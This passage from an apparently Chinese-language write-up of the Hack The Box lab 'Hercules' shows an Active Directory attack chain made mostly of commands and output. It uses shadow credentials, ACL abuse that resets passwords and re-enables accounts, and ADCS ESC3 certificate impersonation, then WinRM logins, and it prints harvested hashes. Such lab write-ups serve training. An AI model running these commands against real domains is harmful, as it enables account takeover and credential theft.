+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;hercules.htb&#39;</span>/<span class="s1">&#39;natalie.a&#39;</span>:<span class="s1">&#39;Prettyprincess123!&#39;</span> -dc-ip 10.10.11.91
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103160650089-575334185.png" alt="image-20251103160646021"></p>
+<p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>natalie.a.ccache
+</span></span></code></pre></div><p>攻击</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad shadow auto -u natalie.a@hercules.htb -p <span class="s1">&#39;Prettyprincess123!&#39;</span> -k -account bob.w -target dc.hercules.htb
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103160909351-1379874826.png" alt="image-20251103160906039"></p>
+<p>拿到<code>bob.w</code>的<code>hash</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">8a65c74e8f0073babbfac6725c66cc3f
+</span></span></code></pre></div><h1 id="acl滥用">
+<a class="header-anchor" href="#acl%e6%bb%a5%e7%94%a8"></a>
+ACL滥用
+</h1><p>现在目标是让<code>bob.w</code>和<code>Security Helpdesk</code>组成员产生联系，用<code>bloodyAD</code>检查下<code>bob.w</code>的可写权限</p>
+<p>先请求<code>bob.w</code>的<code>TGT</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;hercules.htb&#39;</span>/<span class="s1">&#39;bob.w&#39;</span> -hashes :8a65c74e8f0073babbfac6725c66cc3f -dc-ip 10.10.11.91
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103164926169-632850484.png" alt="image-20251103164923135"></p>
+<p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>bob.w.ccache
+</span></span></code></pre></div><p>攻击</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD -u <span class="s1">&#39;bob.w&#39;</span> -p <span class="s1">&#39;&#39;</span> -k -d <span class="s1">&#39;hercules.htb&#39;</span> --host DC.hercules.htb get writable
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103165153479-143466543.png" alt="image-20251103165150017"></p>
+<p>可以将<code>stephen.m</code>从<code>Security Department OU</code> 移动到 <code>Web Department OU</code></p>
+<p>用<code>powerview</code>以<code>bob.w</code>的票据枚举域内的信息</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.10.11.91 -d --no-pass
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Set-DomainObjectDN -Identity stephen.m -DestinationDN <span class="s1">&#39;OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103165435839-896519048.png" alt="image-20251103165432623"></p>
+<p>如果你想的话，移动<code>mark.s</code>也是可以的，重新<code>bloodhound</code>收集分析就会发现<code>natalie.a</code>到<code>stephen.m</code>有路线了，最开始是没有的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103165815304-1558805333.png" alt="image-20251103165812403"></p>
+<p>同样的方法打影子凭证</p>
+<p>先请求<code>natalie.a</code>的<code>TGT</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;hercules.htb&#39;</span>/<span class="s1">&#39;natalie.a&#39;</span>:<span class="s1">&#39;Prettyprincess123!&#39;</span> -dc-ip 10.10.11.91
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103170113195-272871400.png" alt="image-20251103170108796"></p>
+<p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>natalie.a.ccache
+</span></span></code></pre></div><p>攻击</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad shadow auto -u natalie.a@hercules.htb -p <span class="s1">&#39;Prettyprincess123!&#39;</span> -k -account stephen.m -target dc.hercules.htb
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103170959969-151986217.png" alt="image-20251103170956808"></p>
+<p>拿到<code>stephen.m</code>的<code>hash</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">9aaaedcb19e612216a2dac9badb3c210
+</span></span></code></pre></div><p><strong>PS: 出现这种报错的，多半是<code>powerview</code>退出来了，重新执行，别退出来再攻击就可以了</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103171053299-619397510.png" alt="image-20251103171049673"></p>
+<p>接下来就可以通过该用户利用<code>forcechangepassword</code>权限修改<code>auditor</code>的密码，从而远程登录了</p>
+<h1 id="修改auditor密码">
+<a class="header-anchor" href="#%e4%bf%ae%e6%94%b9auditor%e5%af%86%e7%a0%81"></a>
+修改Auditor密码
+</h1><p>先请求<code>stephen.m</code>的<code>TGT</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;hercules.htb&#39;</span>/<span class="s1">&#39;stephen.m&#39;</span> -hashes :9aaaedcb19e612216a2dac9badb3c210 -dc-ip 10.10.11.91
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103171500733-1894801610.png" alt="image-20251103171457518"></p>
+<p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>stephen.m.ccache
+</span></span></code></pre></div><p>修改密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host dc.hercules.htb -d hercules.htb  -u stephen.m -k <span class="nb">set</span> password auditor <span class="s1">&#39;Aa123456!&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103171641868-727241330.png" alt="image-20251103171639019"></p>
+<h1 id="远程登陆-auditorusertxt">
+<a class="header-anchor" href="#%e8%bf%9c%e7%a8%8b%e7%99%bb%e9%99%86-auditorusertxt"></a>
+远程登陆 auditor+user.txt
+</h1><p>kali自带的<code>evil-winrm</code>不好使，在github找一个</p>
+<p>工具：https://github.com/ozelis/winrmexec</p>
+<p>先请求<code>auditor</code>的<code>TGT</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;hercules.htb&#39;</span>/<span class="s1">&#39;auditor&#39;</span>:<span class="s1">&#39;Aa123456!&#39;</span>  -dc-ip 10.10.11.91
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103172634277-1876491255.png" alt="image-20251103172631130"></p>
+<p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>auditor.ccache
+</span></span></code></pre></div><p>登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 evil_winrmexec.py -ssl -port <span class="m">5986</span> -k -no-pass dc.hercules.htb
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103172725023-1397425410.png" alt="image-20251103172721724"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103172751379-139090495.png" alt="image-20251103172748484"></p>
+<p>拿到<code>user.txt</code></p>
+<h1 id="机器信息收集">
+<a class="header-anchor" href="#%e6%9c%ba%e5%99%a8%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+机器信息收集
+</h1><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104104316979-1099720881.png" alt="image-20251104104310690"></p>
+<p>发现我们当前是<code>Forest Management</code>组的成员，查看一下这个组对哪个OU有权限，方便后续操作</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">(</span><span class="nb">Get-ADOrganizationalUnit</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nv">$acl</span><span class="p">=(</span><span class="nb">Get-Acl</span> <span class="s2">&#34;AD:</span><span class="p">$(</span><span class="nv">$_</span><span class="p">.</span><span class="n">DistinguishedName</span><span class="p">)</span><span class="s2">&#34;</span><span class="p">).</span><span class="py">Access</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">IdentityReference</span> <span class="o">-like</span> <span class="s2">&#34;*Forest Management*&#34;</span><span class="p">};</span> <span class="k">if</span><span class="p">(</span><span class="nv">$acl</span><span class="p">){</span> <span class="s2">&#34;</span><span class="p">$(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2">: </span><span class="p">$(</span><span class="nv">$acl</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">ActiveDirectoryRights</span> <span class="n">-join</span> <span class="s1">&#39;, &#39;</span><span class="p">)</span><span class="s2">&#34;</span> <span class="p">}</span> <span class="p">})</span> <span class="n">-join</span> <span class="s2">&#34;</span><span class="se">`n</span><span class="s2">&#34;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104140408598-336855357.png" alt="image-20251104140402752"></p>
+<p>发现对<code>Forest Migration OU</code>有<code>GenericAll</code>权限，所以我们依然可以用前面的方法，通过改密码获取这个<code>OU</code>里用户的凭据</p>
+<p>再查看一下这个<code>OU</code>的用户有哪些</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105165606955-569279037.png" alt="image-20251105165559644"></p>
+<p>发现有个<code>iis_administrator</code>用户，记录一下先</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104141452403-658517656.png" alt="image-20251104141446929"></p>
+<p>在<code>bloodhound</code>发现只有<code>fernando.r</code>在<code>SMARTCARD OPERATORS</code>组里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104142141620-1879081520.png" alt="image-20251104142136265"></p>
+<p>同时注意到这个组是一个证书管理组，还是比较有利用价值的，所以现在的目标是获取到<code>fernando.r</code>用户的凭据，然后尝试下ADCS</p>
+<h1 id="更改fernandor密码">
+<a class="header-anchor" href="#%e6%9b%b4%e6%94%b9fernandor%e5%af%86%e7%a0%81"></a>
+更改fernando.r密码
+</h1><p>将<code>Auditor</code>的<code>OU</code>改成<code>Forest Migration</code>中</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -p <span class="s1">&#39;Aa123456!&#39;</span> -k <span class="nb">set</span> owner <span class="s1">&#39;OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB&#39;</span> Auditor
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104143033568-2017186545.png" alt="image-20251104143028212"></p>
+<p>在给<code>Forest Migration OU</code>一个<code>GenericAll</code>权限</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -p <span class="s1">&#39;Aa123456!&#39;</span> -k add genericAll <span class="s1">&#39;OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB&#39;</span> Auditor
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104143528943-382514929.png" alt="image-20251104143523788"></p>
+<p>现在就可以准备横移了，先检查下<code>fernando.r</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Get-ADUser -Identity <span class="s2">&#34;Fernando.R&#34;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104144052500-2061575013.png" alt="image-20251104144046957"></p>
+<p>先启用一下该用户</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host dc.hercules.htb -d <span class="s1">&#39;hercules.htb&#39;</span> -u <span class="s1">&#39;auditor&#39;</span> -p <span class="s1">&#39;Aa123456!&#39;</span> -k remove uac <span class="s1">&#39;fernando.r&#39;</span> -f ACCOUNTDISABLE
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104153131459-9200239.png" alt="image-20251104153126050"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104153144615-612573370.png" alt="image-20251104153139346"></p>
+<p>发现已经启用了，接下来就可以直接改密码</p>
+<p>改密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -k <span class="nb">set</span> password <span class="s1">&#39;fernando.r&#39;</span> <span class="s1">&#39;Aa123456!&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104153314576-561611725.png" alt="image-20251104153309351"></p>
+<h1 id="adcs-esc3证书攻击">
+<a class="header-anchor" href="#adcs-esc3%e8%af%81%e4%b9%a6%e6%94%bb%e5%87%bb"></a>
+ADCS ESC3证书攻击
+</h1><p>先申请票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;hercules.htb&#39;</span>/<span class="s1">&#39;fernando.r&#39;</span>:<span class="s1">&#39;Aa123456!&#39;</span> -dc-ip 10.10.11.91
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104153518468-727815363.png" alt="image-20251104153513097"></p>
+<p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>fernando.r.ccache
+</span></span></code></pre></div><p>扫描一下有无可以利用证书</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad find -k -no-pass -dc-ip 10.10.11.91 -target dc.hercules.htb  -stdout -vulnerable 
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104153955178-1870192044.png" alt="image-20251104153949648"></p>
+<p>发现可以利用<a href="https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc3-certificate-agent-eku">ECS3</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104160401666-1809661416.png" alt="image-20251104160356232"></p>
+<p>申请证书</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad req -u <span class="s2">&#34;fernando.r@hercules.htb&#34;</span> -k -no-pass -dc-ip 10.10.11.91 -target <span class="s2">&#34;dc.hercules.htb&#34;</span> -ca <span class="s1">&#39;CA-HERCULES&#39;</span> -template <span class="s1">&#39;EnrollmentAgent&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104161127116-504577464.png" alt="image-20251104161121765"></p>
+<h1 id="rbcd">
+<a class="header-anchor" href="#rbcd"></a>
+RBCD
+</h1><p>接下来用这个证书请求允许代表另一个用户的证书，最开始分析只有两个用户可以远程登陆，我们已经成功登录其中一个用户了，现在去请求另一个可以远程登陆的用户<code>ashley.b</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104162714533-2052894244.png" alt="image-20251104162709056"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad req -u <span class="s2">&#34;fernando.r@hercules.htb&#34;</span> -k -no-pass -dc-ip <span class="s2">&#34;10.10.11.91&#34;</span> -target <span class="s2">&#34;dc.hercules.htb&#34;</span> -ca <span class="s1">&#39;CA-HERCULES&#39;</span> -template <span class="s1">&#39;User&#39;</span> -on-behalf-of <span class="s1">&#39;hercules\ashley.b&#39;</span> -pfx fernando.r.pfx -dcom
+</span></span></code></pre></div><p>如果出现如下报错，多半是<code>fernando.r</code>用户又恢复禁止状态了，重新启用一下该用户即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104163304466-2051333946.png" alt="image-20251104163247257"></p>
+<p>重新执行申请<code>ashley.b</code>证书的操作</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104163709292-1180713750.png" alt="image-20251104163703898"></p>
+<p>通过这个证书获取hash来远程登陆</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.10.11.91
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104163953632-1154822052.png" alt="image-20251104163948052"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">:1e719fbfddd226da74f644eac9df7fd2
+</span></span></code></pre></div><h1 id="远程登陆-ashleyb">
+<a class="header-anchor" href="#%e8%bf%9c%e7%a8%8b%e7%99%bb%e9%99%86-ashleyb"></a>
+远程登陆 ashley.b
+</h1><p>申请TGT：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;hercules.htb&#39;</span>/<span class="s1">&#39;ashley.b&#39;</span>  -hashes :1e719fbfddd226da74f644eac9df7fd2 -dc-ip 10.10.11.91
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104164249745-88874379.png" alt="image-20251104164244386"></p>
+<p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>ashley.b.ccache
+</span></span></code></pre></div><p>登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 evil_winrmexec.py -ssl -port <span class="m">5986</span> -k -no-pass dc.hercules.htb
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104164358850-563623805.png" alt="image-20251104164353536"></p>
+<p>发现桌面只有一个ps脚本和Mail目录，Mail下还有个RE_ashley.eml文件</p>
+<ul>
+<li>Mail/RE_ashley.eml</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-zed" data-lang="zed"><span class="line"><span class="cl"><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">ashley</span><span class="p">.</span><span class="n">b</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">Mail</span><span class="o">&gt;</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="n">RE_ashley</span><span class="p">.</span><span class="n">eml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">--</span><span class="n">_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span><span class="w"> </span><span class="nn">multipart/</span><span class="n">alternative</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">boundary</span><span class="o">=</span><span class="err">&#34;</span><span class="n">_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_</span><span class="err">&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">--</span><span class="n">_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span><span class="w"> </span><span class="nn">text/</span><span class="n">plain</span><span class="p">;</span><span class="w"> </span><span class="n">charset</span><span class="o">=</span><span class="err">&#34;</span><span class="n">us</span><span class="o">-</span><span class="n">ascii</span><span class="err">&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span><span class="w"> </span><span class="n">quoted</span><span class="o">-</span><span class="n">printable</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Hello</span><span class="w"> </span><span class="n">Ashley</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">The</span><span class="w"> </span><span class="n">issue</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">facing</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">some</span><span class="w"> </span><span class="n">members</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Department</span><span class="w"> </span><span class="n">were</span><span class="w"> </span><span class="n">once</span><span class="w"> </span><span class="n">p</span><span class="o">=</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">art</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">sensitive</span><span class="w"> </span><span class="n">groups</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">blocking</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">permissions</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">I</span><span class="err">&#39;</span><span class="n">ve</span><span class="w"> </span><span class="n">discussed</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">issue</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">here</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">solution</span><span class="w"> </span><span class="n">th</span><span class="o">=</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">at</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">feel</span><span class="w"> </span><span class="n">works</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">both</span><span class="w"> </span><span class="n">us</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">team</span><span class="p">.</span><span class="w"> </span><span class="n">I</span><span class="err">&#39;</span><span class="n">ve</span><span class="w"> </span><span class="n">attached</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">scr</span><span class="o">=</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ipt</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">team</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">home</span><span class="w"> </span><span class="n">folder</span><span class="p">.</span><span class="w"> </span><span class="n">For</span><span class="w"> </span><span class="n">convenience</span><span class="p">,</span><span class="w"> </span><span class="n">We</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">prov</span><span class="o">=</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ided</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">shortcut</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">IT</span><span class="w"> </span><span class="n">share</span><span class="p">.</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">task</span><span class="w"> </span><span class="n">ma</span><span class="o">=</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">nually</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">powershell</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">issues</span><span class="w"> </span><span class="n">feel</span><span class="w"> </span><span class="n">free</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">inform</span><span class="w"> </span><span class="n">me</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Regards</span><span class="p">,</span><span class="w"> </span><span class="n">Domain</span><span class="w"> </span><span class="n">Admins</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">________________________________</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">From</span><span class="o">:</span><span class="w"> </span><span class="n">Ashley</span><span class="w"> </span><span class="n">Browne</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sent</span><span class="o">:</span><span class="w"> </span><span class="n">Monday</span><span class="w"> </span><span class="err">09</span><span class="o">:</span><span class="err">49</span><span class="o">:</span><span class="err">37</span><span class="w"> </span><span class="n">AM</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">To</span><span class="o">:</span><span class="w"> </span><span class="n">Domain</span><span class="w"> </span><span class="n">Admins</span><span class="w"> </span><span class="o">&lt;</span><span class="n">Administrator</span><span class="err">@</span><span class="n">HERCULES</span><span class="p">.</span><span class="n">HTB</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Subject</span><span class="o">:</span><span class="w"> </span><span class="n">Unable</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">reset</span><span class="w"> </span><span class="n">user</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">password</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Good</span><span class="w"> </span><span class="n">Morning</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Today</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">my</span><span class="w"> </span><span class="n">staff</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">reset</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">user</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">fo</span><span class="o">=</span><span class="w">
